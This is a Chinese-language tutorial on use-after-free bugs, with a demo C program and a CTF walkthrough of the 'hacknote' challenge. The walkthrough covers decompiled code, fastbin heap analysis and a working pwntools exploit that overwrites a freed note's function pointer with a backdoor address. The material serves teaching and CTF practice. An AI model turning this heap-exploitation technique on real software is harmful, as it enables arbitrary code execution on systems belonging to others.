# Use After Free
## 简介
- 简单的说，`Use After Free`即当一个内存块被释放之后再次被使用，但是其实这里有以下几种情况：
  - 内存块被释放后，其对应的指针被设置为`NULL`，然后再次使用，自然程序会崩溃
  - 内存块被释放后，其对应的指针没有被设置为`NULL`，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转
  - 内存块被释放后，其对应的指针没有被设置为`NULL`，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题

- 而一般所指的`Use After Free`漏洞主要是后两种，此外，一般称被释放后没有被设置为`NULL`的内存指针为`dangling pointer`

## 漏洞原理
- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct name
{
	char *myname;
	void (*func)(char *str);
} NAME;

void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("Call print my name\n"); }

int main(void)
{
	NAME *name;
	name = (NAME *)malloc(sizeof(struct name));
	name->func = myprint;
	name->myname = "h3rmesk1t";
	name->func("This is my function!");
	free(name);
	
	name->func("h3rmesk1t");
	name->func = printmyname;
	name->func("This is my function!");
	name = NULL;
	printf("This program will crash!\n");
	name->func("Can not be printed!");
	
	return 0;
}
```

- 示例代码中先创建了一个结构体`name`，该结构体中有两个成员变量，分别是`char`类型的字符串指针和创建的函数指针，接着定义了两个函数：
  - `myprint`，打印传入的字符串
  - `printmyname`，打印字符串`Call print my name`
- 在主函数中，先创建了一个结构体指针`name`并给其分配空间，`name`结构体的`func`成员变量赋值为`myprint`函数，并且传入了字符串参数`This is my function!`，使得`myname`成员变量赋值为`h3rmesk1t`

![](images/1.png#pic_center)

- 接着释放结构体`name`，但是结构体指针释放后并未置空，在释放后继续调用`func`成员变量中的`myprint`函数，发现依旧可以调用`myprint`函数

![](images/2.png#pic_center)

![](images/3.png#pic_center)

- 接着将`func`成员变量中的函数指针更改成了`printmyname`函数，并且调用`func`成员变量，虽然`printmyname`函数不需要参数，但为了能够让程序认为这里依然是`myprint`函数，并且认为操作是合法的，所以传入了参数`This is my function`，即使改变了成员变量中的函数指针，但依然可以顺利执行`printmyname`函数，并打印出`printmyname`函数中原有打印`Call print my name`的功能

![](images/4.png#pic_center)

![](images/5.png#pic_center)

- 接着将结构体`name`置空，打印出一个提示字符串，此时再一次调用`func`成员变量，只会出现了提示标语，不会调用`func`成员变量执行`printmyname`函数

## CTF例题
### 静态分析
- 首先是一个菜单来进行选择

```c
int menu()
{
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");zz
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  return printf("Your choice :");
}
```

- 在`add_note`函数中，第一个判断说明的是最多创建`5`个`note`，接下来循环`5`次，程序会判断`notelist + i`的位置是否已经有`malloc`指针
- `notelist`其实是`bss`段的一个全局变量，里面存放的都是`malloc`指针，也就是结构体指针，其地址为`0x0804A070`
- 在判断之后发现这个位置并没有结构体指针，那么就会创建一个`8`字节的`chunk`，后简称`struct_chunk`，需要注意的是因为这个程序是`32`位的，所以`8`个字节是两个地址位宽，也就是说这两个地址位宽中存放的其实是两个成员变量
- 在判断之后会在`notelist + i`位置放置`print_note_content`函数指针，`print_note_content`函数需要传入一个`int`型的参数，并打印出整型`+4`的地址处的内容
- 接下来会打印字符串提示创建`note`的大小，外部输入的数值会存放到`size`变量中，`v0`变量以整型的形式装载结构体指针，并且在整型`+4`的地址处开辟`size`大小的`chunk`，后简称`content_chunk`，接下来是判断是否创建成功，如果创建成功则提示输入`note`的内容，程序会调用`read`函数将输入的内容放在`*((void **)*(&notelist + i) + 1`处，这里的`+1`其实是加一个地址位宽处的地址，也就是`content_chunk`中，并且`read`函数的三参是`size`，所以这里无法进行溢出

```c
unsigned int add_note()
{
  int v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&notelist + i) )
      {
        *(&notelist + i) = malloc(8u);
        if ( !*(&notelist + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)*(&notelist + i) = print_note_content;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = (int)*(&notelist + i);
        *(_DWORD *)(v0 + 4) = malloc(size);
        if ( !*((_DWORD *)*(&notelist + i) + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)*(&notelist + i) + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

```c
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```

- 在`del_note`函数中，首先输入需要删除`note`的`id`，接下来会将输入的数字赋给`v1`变量
- `if`判断输入的数值是否合法，如果合法下一个`if`判断`notelist + v1`的位置是否有结构体，如果有的话首先释放`content_chunk`，然后释放`struct_chunk`，这里就出现了释放之后`chunk`指针不置空的问题，很有可能触发`Use After Free`

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&notelist + v1) )
  {
    free(*((void **)*(&notelist + v1) + 1));
    free(*(&notelist + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

- 在`print_note`函数中，首先输入需要打印的`note`的`id`，接下来做一个合法性判断，第二个`if`判断`notelist + v1`位置是否有结构体被创建，如果有则打印`content_chunk`中的内容
- 第一个`&notelist + v1`代表的是`print_note_content`函数，因为在创建`note`功能的时候`print_note_content`函数指针就是放在结构体的第一个成员变量中的，后面的`(*(&notelist + v1))`其实是`print_note_content`函数的参数，`(*(&notelist + v1))`本身其实是个地址，但是存入`print_note_content`函数后被强制转换成`int`型，`+4`之后其实是加了`4`个字节，也就是正好到`content_chunk`的位置，就相当于`puts(content_chunk)`

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&notelist + v1) )
    (*(void (__cdecl **)(_DWORD))*(&notelist + v1))(*(&notelist + v1));
  return __readgsdword(0x14u) ^ v3;
}
```

- 同时，程序中存在后门函数`magic`

```c
int magic()
{
  return system("cat flag");
}
```

### 动态分析
- 在静态分析中，主要存在以下利用点：
  - `del_note`函数中`free`掉结构体后，`chunk`指针未置空
  - `chunk`指针起始位置为`notelist`全局变量的地址`0x0804A070`
  - 存在后门函数`0x08048986`

- 先尝试创建两个`note`，并查看一下`notelist`全局变量地址信息

![](images/6.png#pic_center)


- 可以看到创建的两个`note`的`malloc`指针为：`0x0804b1a0`和`0x0804b1d0`，由于`malloc`指针指向的是`chunk`的内容部分，因此完整的`chunk`结构体还要减去`0x8`

![](images/7.png#pic_center)

- 两个`note`的结构如下图所示

![](images/8.png#pic_center)

- 虽然`chunk`在一起，但是无法进行溢出，没有修改功能，也无法构造结构体，因此只能从释放`chunk`与重新申请`chunk`下手，由于存在后门函数，尝试将结构体中的`print`函数指针替换成后门函数指针

- 在一个`32`位程序中，如果申请一个`8`字节的`chunk`，恰好`bin`中有一个空闲的`16`个字节`8+8`的`chunk`，那么就会直接从`bin`中摘取这个`16`字节的`chunk`
- 首先释放`chunk1`，再释放`chunk2`，可以看到在释放`chunk1`和`chunk2`后，两个`struct chunk`被分进了`fastbin`的`0x10`单向链表，两个`content chunk`被分进了`fastbin`的`0x20`单向链表，结构图如下所示

![](images/9.png#pic_center)

![](images/10.png#pic_center)

- 此时如果申请`content chunk`且大小为`8`，那么程序则会从`fastbin`的`0x10`单向链表中分配两个`0x10`的`chunk`
- 由于`chunk2`是后被释放，所以在`fastbin`中先被摘除，原`chunk2`的`struct chunk`空间被重新启用作为`chunk3`的`struct chunk`，原`chunk1`的`struct chunk`空间被重新启用作为`chunk3`的`content chunk`，结构图如图所示

![](images/11.png#pic_center)

- 这样一来，在创建`chunk3`时，向`content chunk`中写数据的时候直接写上`system("cat flag")`地址，那么`sys_addr`就会写在`chunk1`的`print`函数指针的位置
- 由于在释放时，`chunk`指针未置空，因此依旧可以调用`chunk1`的打印功能，此时直接在菜单中选择`print_node`，选择`node0`即可触发`system("cat flag")`

### EXP

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('./hacknote')

def addnode(size, content):
    r.recvuntil(b'Your choice :')
    r.sendline(b'1')
    r.recvuntil(b'Note size :')
    r.sendline(size)
    r.recvuntil(b'Content :')
    r.sendline(content)

def delnode(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'2')
    r.recvuntil(b'Index :')
    r.sendline(index)

def printnode(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'3')
    r.recvuntil(b'Index :')
    r.sendline(index)


magic_addr = 0x08048986
addnode(b'24', b'chunk1')
addnode(b'24', b'chunk2')
delnode(b'0')
delnode(b'1')
addnode(b'8', p32(magic_addr))
printnode(b'0')

r.interactive()
```

![](images/12.png#pic_center)